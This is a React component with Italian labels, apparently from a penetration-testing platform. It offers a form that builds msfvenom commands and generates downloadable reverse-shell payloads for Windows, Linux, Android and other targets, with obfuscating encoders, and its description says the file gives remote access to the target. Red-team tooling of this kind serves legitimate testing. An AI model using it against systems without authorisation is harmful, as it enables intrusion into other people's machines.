import React, { useState, useEffect } from 'react';
import {
  Container,
  Row,
  Col,
  Form,
  Button,
  Spinner,
  Alert,
  Card,
  Badge,
  InputGroup
} from 'react-bootstrap';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faDownload } from '@fortawesome/free-solid-svg-icons';
import api from '../../api/api';

const PayloadGenerator = () => {
  const [payloads, setPayloads] = useState([]);
  const [encoders, setEncoders] = useState([]);
  const [formats, setFormats] = useState([]);
  const [selectedPayload, setSelectedPayload] = useState('');
  const [selectedEncoder, setSelectedEncoder] = useState('');
  const [iterations, setIterations] = useState(1);
  const [lhost, setLhost] = useState('');
  const [lport, setLport] = useState('4444');
  const [ahost, setAhost] = useState('127.0.0.1');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [result, setResult] = useState(null);
  const [filteredPayloads, setFilteredPayloads] = useState([]);
  const [payloadType, setPayloadType] = useState('windows');
  const [successMessage, setSuccessMessage] = useState(null);

  // Filtra i payload in base al sistema operativo target
  useEffect(() => {
    if (payloads.length > 0) {
      const filtered = payloads.filter(payload => 
        payload.startsWith(payloadType + '/'));
      setFilteredPayloads(filtered);
      
      if (filtered.length > 0 && !selectedPayload.startsWith(payloadType + '/')) {
        setSelectedPayload(filtered[0]);
      }
    }
  }, [payloadType, payloads, selectedPayload]);

  // Carica i dati necessari all'inizializzazione
  useEffect(() => {
    const fetchData = async () => {
      try {
        // Fetch dei payload disponibili
        const payloadsResponse = await api.exploitation.getAvailablePayloads();
        if (payloadsResponse.status === 'success') {
          setPayloads(payloadsResponse.payloads);
        }

        // Fetch degli encoder disponibili
        const encodersResponse = await api.exploitation.getAvailableEncoders();
        if (encodersResponse.status === 'success') {
          // Assicuriamoci che gli encoders siano gestiti correttamente
          setEncoders(encodersResponse.encoders);
        }

        // Fetch dei formati disponibili
        const formatsResponse = await api.exploitation.getAvailableFormats();
        if (formatsResponse.status === 'success') {
          setFormats(formatsResponse.formats);
        }
      } catch (error) {
        console.error('Errore nel caricamento dei dati:', error);
        setError('Errore nel caricamento dei dati. Riprova più tardi.');
      }
    };

    fetchData();
  }, []);

  // Ottiene l'IP locale del client
  useEffect(() => {
    const getLocalIp = async () => {
      try {
        // Utilizziamo un endpoint ipify o simile per ottenere l'IP pubblico
        // In una situazione reale, si potrebbe determinare anche l'IP locale
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setLhost(data.ip);
      } catch (error) {
        console.error('Errore nel recupero dell\'IP:', error);
        setLhost('');
      }
    };

    getLocalIp();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setResult(null);
    setSuccessMessage(null);

    // Validazione input
    if (!lhost || !lport || !selectedPayload) {
      setError('Compila tutti i campi obbligatori');
      setLoading(false);
      return;
    }

    try {
      const options = {
        LHOST: lhost,
        LPORT: lport
      };

      // Aggiungi AHOST se necessario per bind_hidden_tcp
      if (selectedPayload.includes('bind_hidden_tcp')) {
        options.AHOST = ahost;
      }

      // Aggiungi encoder se selezionato
      if (selectedEncoder) {
        options.encoder = selectedEncoder;
        options.iterations = iterations === '' ? 1 : iterations;
      }

      const response = await api.exploitation.generatePayload(selectedPayload, options);

      if (response.status === 'success') {
        // Ricostruisco il comando msfvenom basato sui parametri inviati
        const command = `msfvenom -p ${selectedPayload} LHOST=${lhost} LPORT=${lport}${selectedPayload.includes('bind_hidden_tcp') ? ` AHOST=${ahost}` : ''}${selectedEncoder ? ` -e ${selectedEncoder} -i ${iterations}` : ''}`;
        
        // Aggiungo il comando ricostruito alla risposta
        response.command = command;
        
        setResult(response);
        setSuccessMessage('Payload generato con successo');
      } else {
        setError(response.message || 'Errore durante la generazione del payload');
      }
    } catch (error) {
      console.error('Errore nella generazione del payload:', error);
      setError(error.message || 'Errore di connessione al server');
    } finally {
      setLoading(false);
    }
  };

  // Funzione per gestire il download diretto del payload - Metodo originale
  const handleDownloadOriginal = () => {
    if (!result || !result.payload_data) {
      setError('Payload non disponibile per il download');
      console.error('Dati payload mancanti:', result);
      return;
    }

    try {
      console.log('Avvio download del payload, dimensione base64:', result.payload_data.length);
      
      // Converte il payload base64 in array binario
      const binaryData = atob(result.payload_data);
      console.log('Decodifica base64 completata, dimensione binaria:', binaryData.length);
      
      const byteArray = new Uint8Array(binaryData.length);
      
      for (let i = 0; i < binaryData.length; i++) {
        byteArray[i] = binaryData.charCodeAt(i);
      }
      
      // Crea un Blob dal payload
      const blob = new Blob([byteArray], { type: result.mime_type || 'application/octet-stream' });
      console.log('Blob creato con MIME type:', result.mime_type || 'application/octet-stream');
      
      // Crea un URL dal Blob
      const url = window.URL.createObjectURL(blob);
      console.log('URL creato:', url);
      
      // Crea un elemento <a> temporaneo per il download
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', result.filename);
      link.setAttribute('target', '_blank');
      
      // Aggiunge eventListener per verificare il completamento
      link.addEventListener('click', () => {
        console.log('Link cliccato, download dovrebbe iniziare');
        setTimeout(() => {
          window.URL.revokeObjectURL(url);
          console.log('URL revocato dopo timeout');
        }, 100);
      });
      
      // Rendi il link visibile e forzane il click
      link.style.display = 'none';
      document.body.appendChild(link);
      
      console.log('Tentativo di download per:', result.filename);
      link.click();
      
      // Rimuovi il link dopo un breve timeout
      setTimeout(() => {
        document.body.removeChild(link);
        console.log('Link rimosso dal DOM');
      }, 200);
      
    } catch (err) {
      console.error('Errore nel download del payload:', err);
      setError(`Errore nel download del payload: ${err.message}`);
    }
  };

  // Nuovo metodo di download - Metodo alternativo utilizzando Data URL diretti
  const handleDownload = () => {
    if (!result || !result.payload_data) {
      setError('Payload non disponibile per il download');
      console.error('Dati payload mancanti:', result);
      return;
    }

    try {
      console.log('Tentativo di download alternativo...');
      
      // Metodo alternativo 1: Usare direttamente il data URL
      const dataUrl = `data:${result.mime_type || 'application/octet-stream'};base64,${result.payload_data}`;
      console.log('Data URL creato (inizio troncato):', dataUrl.substring(0, 50) + '...');
      
      const link = document.createElement('a');
      link.href = dataUrl;
      link.download = result.filename;
      
      // Utilizza il metodo click() del browser
      console.log('Avvio download diretto per:', result.filename);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      // Feedback all'utente
      setSuccessMessage('Download avviato. Se non vedi il file, controlla la cartella dei download.');
      
    } catch (err) {
      console.error('Errore nel download alternativo:', err);
      
      // Se il metodo alternativo fallisce, prova il metodo originale
      console.log('Tentativo con metodo originale...');
      handleDownloadOriginal();
    }
  };

  return (
    <div className="payload-generator-container">
      <Container>
        <h3 className="section-title">Generazione Payload</h3>
        <p className="section-description">
          Utilizza questo strumento per generare un payload eseguibile utilizzando msfvenom. Dopo la creazione, potrai scaricare il file ed utilizzarlo per ottenere l'accesso remoto al sistema target.
        </p>

        <Card className="payload-form-card mb-4">
          <Card.Body>
            <Form onSubmit={handleSubmit}>
              <Form.Group className="mb-3">
                <Form.Label>Sistema operativo target</Form.Label>
                <Form.Select
                  value={payloadType}
                  onChange={(e) => setPayloadType(e.target.value)}
                >
                  <option value="windows">Windows</option>
                  <option value="linux">Linux</option>
                  <option value="android">Android</option>
                  <option value="osx">macOS</option>
                  <option value="java">Java</option>
                  <option value="php">PHP</option>
                </Form.Select>
              </Form.Group>

              <Form.Group className="mb-3">
                <Form.Label>Tipo di Payload</Form.Label>
                <Form.Select
                  value={selectedPayload}
                  onChange={(e) => setSelectedPayload(e.target.value)}
                >
                  {Array.isArray(filteredPayloads) && filteredPayloads.map((payload) => (
                    <option key={payload} value={payload}>
                      {payload}
                    </option>
                  ))}
                </Form.Select>
              </Form.Group>

              <Form.Group className="mb-3">
                <Form.Label>LHOST (IP per la connessione inversa)</Form.Label>
                <Form.Control
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  placeholder="es. 192.168.1.100"
                />
              </Form.Group>

              <Form.Group className="mb-3">
                <Form.Label>LPORT (Porta per la connessione inversa)</Form.Label>
                <Form.Control
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  placeholder="es. 4444"
                />
              </Form.Group>

              {selectedPayload.includes('bind_hidden_tcp') && (
                <Form.Group className="mb-3">
                  <Form.Label>AHOST (Indirizzo di ascolto nascosto)</Form.Label>
                  <Form.Control
                    type="text"
                    value={ahost}
                    onChange={(e) => setAhost(e.target.value)}
                    placeholder="es. 127.0.0.1"
                  />
                </Form.Group>
              )}

              <Form.Group className="mb-3">
                <Form.Label>Encoder (Offuscamento)</Form.Label>
                <Form.Select
                  value={selectedEncoder}
                  onChange={(e) => setSelectedEncoder(e.target.value)}
                >
                  <option value="">Nessun encoder</option>
                  {Array.isArray(encoders) && encoders.map((encoder) => (
                    <option 
                      key={typeof encoder === 'object' ? encoder.name : encoder} 
                      value={typeof encoder === 'object' ? encoder.name : encoder}
                    >
                      {typeof encoder === 'object' 
                        ? `${encoder.name}${encoder.description ? ` - ${encoder.description}` : ''}`
                        : encoder}
                    </option>
                  ))}
                </Form.Select>
              </Form.Group>

              {selectedEncoder && (
                <Form.Group className="mb-3">
                  <Form.Label>Iterazioni dell'encoder</Form.Label>
                  <Form.Control
                    type="number"
                    value={iterations}
                    onChange={(e) => {
                      const val = e.target.value;
                      if (val === '') {
                        setIterations('');
                      } else {
                        setIterations(parseInt(val) || 1);
                      }
                    }}
                    min="1"
                    max="10"
                  />
                </Form.Group>
              )}

              <div className="mt-4">
                <Button
                  variant="primary"
                  type="submit"
                  disabled={loading}
                  className="btn-generate"
                >
                  {loading ? (
                    <>
                      <Spinner
                        as="span"
                        animation="border"
                        size="sm"
                        role="status"
                        aria-hidden="true"
                        className="me-2"
                      />
                      Generazione in corso...
                    </>
                  ) : (
                    'Genera Payload'
                  )}
                </Button>
              </div>
            </Form>
          </Card.Body>
        </Card>

        {error && (
          <Alert variant="danger" className="mt-3">
            {error}
          </Alert>
        )}

        {successMessage && (
          <Alert variant="success" className="mt-3">
            {successMessage}
          </Alert>
        )}

        {result && (
          <div className="result-container">
            <Card className="mb-4">
              <Card.Header className="bg-success text-white">
                <div className="d-flex align-items-center">
                  <Badge bg="light" text="success" className="me-2">SUCCESS</Badge>
                  <span>Il payload è stato generato con successo!</span>
                </div>
              </Card.Header>
              <Card.Body>
                <h5 className="result-section-title">Payload Generato</h5>
                <div className="command-box mb-4">
                  <code>{result.command || "msfvenom generazione completata. Nessun comando disponibile per la visualizzazione."}</code>
                </div>
                
                <Row className="mt-3">
                  <Col>
                    <Button 
                      variant="success" 
                      onClick={handleDownload} 
                      className="d-flex align-items-center"
                    >
                      <FontAwesomeIcon icon={faDownload} className="me-2" />
                      Scarica Payload
                    </Button>
                  </Col>
                </Row>
              </Card.Body>
            </Card>
          </div>
        )}
      </Container>
    </div>
  );
};

export default PayloadGenerator; 